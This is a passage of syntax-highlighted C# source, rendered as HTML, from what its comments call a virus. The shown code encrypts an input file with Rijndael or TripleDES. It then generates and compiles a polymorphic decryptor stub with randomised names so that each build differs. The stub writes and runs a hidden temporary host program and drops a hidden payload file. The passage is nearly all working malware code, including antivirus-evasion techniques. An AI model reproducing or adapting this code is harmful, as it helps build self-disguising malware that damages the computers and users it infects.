            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">b</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Encrypt</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">inf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">outf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">e</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc2">//based on e we decide which encryption that we are
</span><span class="sc0">            </span><span class="sc2">//going to use for the virus. Since C# had a crypto
</span><span class="sc0">            </span><span class="sc2">//package I thought we try those out.
</span><span class="sc0">            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">e</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">try</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">p</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">getKey</span><span class="sc10">();</span><span class="sc0">

                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">p</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0">
                        </span><span class="sc11">p</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">p</span><span class="sc10">.</span><span class="sc11">Substring</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">p</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">add</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">p</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">add</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
                            </span><span class="sc11">p</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">p</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc11">UnicodeEncoding</span><span class="sc0"> </span><span class="sc11">UE</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">UnicodeEncoding</span><span class="sc10">();</span><span class="sc0">
                    </span><span class="sc16">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">UE</span><span class="sc10">.</span><span class="sc11">GetBytes</span><span class="sc10">(</span><span class="sc11">p</span><span class="sc10">);</span><span class="sc0">

                    </span><span class="sc11">FileStream</span><span class="sc0"> </span><span class="sc11">fsc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileStream</span><span class="sc10">(</span><span class="sc11">outf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileMode</span><span class="sc10">.</span><span class="sc11">Create</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">RijndaelManaged</span><span class="sc0"> </span><span class="sc11">cr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">RijndaelManaged</span><span class="sc10">();</span><span class="sc0">
                    </span><span class="sc11">CryptoStream</span><span class="sc0"> </span><span class="sc11">cs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">CryptoStream</span><span class="sc10">(</span><span class="sc11">fsc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">cr</span><span class="sc10">.</span><span class="sc11">CreateEncryptor</span><span class="sc10">(</span><span class="sc11">key</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">CryptoStreamMode</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">FileStream</span><span class="sc0"> </span><span class="sc11">fsIn</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileStream</span><span class="sc10">(</span><span class="sc11">inf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileMode</span><span class="sc10">.</span><span class="sc11">Open</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">d</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">d</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fsIn</span><span class="sc10">.</span><span class="sc11">ReadByte</span><span class="sc10">())</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">cs</span><span class="sc10">.</span><span class="sc11">WriteByte</span><span class="sc10">((</span><span class="sc16">byte</span><span class="sc10">)</span><span class="sc11">d</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc11">fsIn</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
                    </span><span class="sc11">cs</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
                    </span><span class="sc11">fsc</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">

                </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">catch</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">try</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

                    </span><span class="sc16">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">b</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">read</span><span class="sc10">(</span><span class="sc11">inf</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc16">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">FromBase64String</span><span class="sc10">(</span><span class="sc11">getKey</span><span class="sc10">());</span><span class="sc0">
                    </span><span class="sc16">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">IV</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">FromBase64String</span><span class="sc10">(</span><span class="sc11">getIV</span><span class="sc10">());</span><span class="sc0">

                    </span><span class="sc11">FileStream</span><span class="sc0"> </span><span class="sc11">fs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Open</span><span class="sc10">(</span><span class="sc11">outf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileMode</span><span class="sc10">.</span><span class="sc11">OpenOrCreate</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">CryptoStream</span><span class="sc0"> </span><span class="sc11">cs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">CryptoStream</span><span class="sc10">(</span><span class="sc11">fs</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">TripleDESCryptoServiceProvider</span><span class="sc10">().</span><span class="sc11">CreateEncryptor</span><span class="sc10">(</span><span class="sc11">key</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">IV</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">CryptoStreamMode</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">BinaryWriter</span><span class="sc0"> </span><span class="sc11">bw</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">BinaryWriter</span><span class="sc10">(</span><span class="sc11">cs</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">bw</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">b</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">bw</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
                    </span><span class="sc11">cs</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
                    </span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">

                </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">catch</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        
        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">Decryptor</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">f</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">num</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">hl</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">e</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc2">//this is the decryptor that we build on the fly
</span><span class="sc0">        </span><span class="sc2">//since we build it on the fly we can easily change
</span><span class="sc0">            </span><span class="sc2">//variables making our application different each
</span><span class="sc0">            </span><span class="sc2">//time we run it. When i was actually building it I got a 
</span><span class="sc0">        </span><span class="sc2">//false positive from my A.V. that said it was another virus
</span><span class="sc0">        </span><span class="sc2">//which is kind of interesting...
</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">name</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Directory</span><span class="sc10">.</span><span class="sc11">GetCurrentDirectory</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\\"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">  </span><span class="sc11">Rand</span><span class="sc10">()</span><span class="sc0">  </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">DateTime</span><span class="sc10">.</span><span class="sc11">Now</span><span class="sc10">.</span><span class="sc11">Year</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".exe"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">ICodeCompiler</span><span class="sc0"> </span><span class="sc11">ic</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">CSharpCodeProvider</span><span class="sc10">().</span><span class="sc11">CreateCompiler</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">CompilerParameters</span><span class="sc0"> </span><span class="sc11">cp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">CompilerParameters</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">cp</span><span class="sc10">.</span><span class="sc11">ReferencedAssemblies</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc6">"System.dll"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">cp</span><span class="sc10">.</span><span class="sc11">ReferencedAssemblies</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc6">"System.Windows.Forms.dll"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">cp</span><span class="sc10">.</span><span class="sc11">GenerateExecutable</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">cp</span><span class="sc10">.</span><span class="sc11">CompilerOptions</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"/target:winexe"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">cp</span><span class="sc10">.</span><span class="sc11">OutputAssembly</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">name</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc11">Random</span><span class="sc0"> </span><span class="sc11">r</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Random</span><span class="sc10">();</span><span class="sc0">
             
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Rand</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">r</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc4">100</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">n2</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Rand</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hl</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">r2</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Rand</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">r</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc11">hl</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">d</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"\n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"using System; \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"using System.Windows.Forms; \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"using System.Security.Cryptography; \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"using System.Text; \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"using System.Diagnostics; \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"using System.IO; \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"using System.Threading; \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"namespace "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" { \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"   class "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">n2</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">": Form { \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">

            </span><span class="sc6">"       static string cf = Convert.ToString(Process.GetCurrentProcess().MainModule.FileName); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"       static string inf = @\""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">f</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\"; \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"       static string outf = @\""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">n2</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".exe\"; \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"       static string tmp = @\""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">n2</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">r2</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">".exe\"; \n"</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">e</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">d</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">"static string p = @\""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">getKey</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\"; \n"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">d</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">"static byte[] Key = Convert.FromBase64String(\""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">getKey</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\"); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                     </span><span class="sc6">"static byte[] IV  = Convert.FromBase64String(\""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">getIV</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\"); \n"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc11">d</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">"  public static void Main() { \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"             "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">r2</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"(); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"       } \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"       private static void "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">r2</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"() { \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"           try { \n "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">

                            </span><span class="sc2">//read current file into byte array
</span><span class="sc0">            </span><span class="sc6">"               FileStream fs = new FileStream(cf, FileMode.Open, FileAccess.Read); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"               BinaryReader brb = new BinaryReader(fs); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"               byte[] b = new byte[fs.Length]; \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"               for (int q = 0; q &lt; b.Length; q++) { \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"                   b[q] = brb.ReadByte(); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"               } \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"               brb.Close(); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"               fs.Close(); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">

                            </span><span class="sc2">//write temp host program
</span><span class="sc0">            </span><span class="sc6">"               FileStream fsb = new FileStream(tmp, FileMode.CreateNew); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"               BinaryWriter bwb = new BinaryWriter(fsb); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"               for (int z = "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">num</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"; z &lt; "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hl</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"; z++) { \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"                    bwb.BaseStream.WriteByte(b[z]); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"               } \n "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"               fsb.Close(); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"               bwb.Close(); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"               File.SetAttributes(tmp, FileAttributes.Hidden); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">

                            </span><span class="sc2">//start temp program and wait for it to exit
</span><span class="sc0">            </span><span class="sc6">"               try { \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"                   Process.Start(tmp).WaitForExit(); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"                   File.Delete(tmp); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"               } catch { } \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">

                            </span><span class="sc2">//read encrypted version and write to a file
</span><span class="sc0">            </span><span class="sc6">"               FileStream fb = new FileStream(inf, FileMode.CreateNew); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"               BinaryWriter bw = new BinaryWriter(fb); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"               for (int z = "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">hl</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"; z &lt; b.Length; z++) { \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"                    bw.BaseStream.WriteByte(b[z]); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"               } \n "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"               fb.Close(); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"               bw.Close(); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
            </span><span class="sc6">"               File.SetAttributes(inf, FileAttributes.Hidden); \n"</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">e</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">d</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">"      if(p.Length &gt; 8) { \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                     </span><span class="sc6">"          p = p.Substring(0,8); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                     </span><span class="sc6">"      } else if(p.Length &lt; 8) { \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                     </span><span class="sc6">"          int a = 8 - p.Length; \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                     </span><span class="sc6">"          for(int i = 0; i &lt; a; i++) \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                     </span><span class="sc6">"              p = p + i; \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                     </span><span class="sc6">"      } \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                     </span><span class="sc6">"      UnicodeEncoding UE = new UnicodeEncoding(); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                     </span><span class="sc6">"      byte[] k = UE.GetBytes(p); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                     </span><span class="sc6">"      FileStream fr = new FileStream(inf, FileMode.Open); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                     </span><span class="sc6">"      RijndaelManaged r = new RijndaelManaged(); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                     </span><span class="sc6">"      CryptoStream cs = new CryptoStream(fr, r.CreateDecryptor(k, k), CryptoStreamMode.Read); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                     </span><span class="sc6">"      if(File.Exists(outf)) { \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                     </span><span class="sc6">"          File.Delete(outf); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                     </span><span class="sc6">"      } \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                     </span><span class="sc6">"      FileStream o = new FileStream(outf, FileMode.Create); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                     </span><span class="sc6">"      int data; \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                     </span><span class="sc6">"      while((data = cs.ReadByte()) != -1) { \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                     </span><span class="sc6">"          o.WriteByte((byte)data); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                     </span><span class="sc6">"      } \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                     </span><span class="sc6">"      o.Close(); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                     </span><span class="sc6">"      cs.Close(); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                     </span><span class="sc6">"      fr.Close(); \n"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">d</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">"      FileStream fr = new FileStream(inf, FileMode.Open); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                     </span><span class="sc6">"      CryptoStream cs = new CryptoStream(fr, new TripleDESCryptoServiceProvider().CreateDecryptor(Key, IV), CryptoStreamMode.Read); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                     </span><span class="sc6">"      if(File.Exists(outf)) { \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                     </span><span class="sc6">"          File.Delete(outf); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                     </span><span class="sc6">"      } \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">

                     </span><span class="sc6">"      FileStream o = new FileStream(outf, FileMode.Create); \n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
                     </span><span class="sc6">"      int data; \n "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0">
